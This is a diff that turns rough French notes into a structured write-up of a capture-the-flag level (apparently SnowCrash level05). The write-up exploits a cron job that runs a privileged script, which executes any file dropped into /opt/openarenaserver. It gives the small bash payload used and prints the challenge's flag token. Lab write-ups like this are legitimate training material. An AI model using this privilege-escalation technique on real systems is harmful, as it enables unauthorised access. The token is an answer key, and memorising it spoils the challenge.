@@ -1,51 +1,57 @@
-redemarer votre vm ou ssh
+# Rapport CTF - [level05]
 
-on as un nouveau mail ? 
+## Informations générales
+- **Durée :** [1h]
+- **Équipe :** [vmuller]
+- **Participants :** [Valentin Muller]
 
-find / -type d -name "mail" 2> /dev/null
+## Réalisations
 
-cd /var/mail
+1. ### Objectif 1 - Recherche du fichier "mail"
+   - **Description :** L'épreuve consistait à rechercher le fichier "mail" pour trouver des informations importantes.
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Utilisation de la commande `find / -type d -name "mail" 2> /dev/null` pour trouver le répertoire contenant les fichiers de courrier.
+     - Navigation vers le répertoire `/var/mail`.
+     - Consultation du contenu du fichier "level05" avec `cat level05`.
 
-cat level05
+2. ### Objectif 2 - Analyse du contenu du mail
+   - **Description :** Analyser le contenu du mail pour comprendre les informations relatives à l'exécution d'un programme.
+   - **Solution :** Les étapes suivantes ont été suivies :
+     - Lecture du contenu du fichier "level05".
+     - Identification de la planification de l'exécution du programme "openarenaserver" toutes les 2 minutes.
 
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+3. ### Objectif 3 - Analyse du script "openarenaserver"
+   - **Description :** Analyser le script "openarenaserver" pour comprendre son fonctionnement.
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Affichage du contenu du script "openarenaserver" avec `cat /usr/sbin/openarenaserver`.
+     - Observation que le script exécute tous les programmes dans le répertoire "/opt/openarenaserver" puis les supprime.
+     - Vérification des permissions du script (permissions "rwxr-x---+").
 
-oh  ok ce mail nous dit que toute les 2min le programme openarenaserver vas s'execute, mais que fait ce programme ?
+4. ### Objectif 4 - Création d'un programme malveillant
+   - **Description :** Créer un programme malveillant pour exploiter les privilèges du script "openarenaserver".
+   - **Solution :** Les étapes suivantes ont été effectuées :
+     - Création d'un nouveau fichier "test.sh" avec `echo > test.sh`.
+     - Édition du fichier "test.sh" avec `vim test.sh` et ajout du code suivant :
+       ```bash
+       #!/bin/bash
 
-cat /usr/sbin/openarenaserver
+       # Commande dont vous souhaitez obtenir le résultat
+       commande="getflag"
 
-on peux voir que ce script bash vas executer tout les programmes dans le dossier /otp/openarenaserver puis vas suprimmer le programme
+       # Chemin complet du fichier de sortie dans /tmp
+       fichier_sortie="/tmp/resultat.txt"
 
-on peux voir en faisant la -la dans le docier que ce sript bash a les permisions: -rwxr-x---+
+       # Exécute la commande et redirige la sortie vers le fichier de sortie
+       $commande > $fichier_sortie
+       ```
+     - Attendre que le script "openarenaserver" exécute "test.sh" toutes les 2 minutes.
 
-le + signifie qu'il a des drois d'admin ou en tout cas supérieur au notre
+5. ### Objectif 5 - Obtention du flag
+   - **Description :** Obtenir le flag en exécutant le programme malveillant "test.sh".
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Navigation vers le répertoire "/tmp".
+     - Affichage du contenu du fichier "resultat.txt" avec `cat resultat.txt` pour obtenir le token : "viuaaale9huek52boumoomioc".
 
-ok, alors si on a les drois, on vas créer un petit programme
-
-echo > test.sh
-
-vim test.st
-
-```sh
-#!/bin/bash
-
-# Commande dont vous souhaitez obtenir le résultat
-commande="votre_commande" 
-# de preférence getflag
-
-# Chemin complet du fichier de sortie dans /tmp
-fichier_sortie="/tmp/resultat.txt"
-
-# Exécute la commande et redirige la sortie vers le fichier de sortie
-$commande > $fichier_sortie
-```
-
-plus qu'a attendre 
-
-cd /tmp
-
-cat resultat.txt
-
-voilla notre token 
-
-Check flag.Here is your token : viuaaale9huek52boumoomioc
+## Réflexions finales
+- **Expérience globale :** L'épreuve liée à level05 a nécessité la compréhension des autorisations de fichiers et l'exploitation d'une vulnérabilité pour exécuter une commande malveillante.
+- **Leçons apprises :** J'ai acquis des compétences en analyse de scripts et en création de programmes malveillants pour exploiter des privilèges.
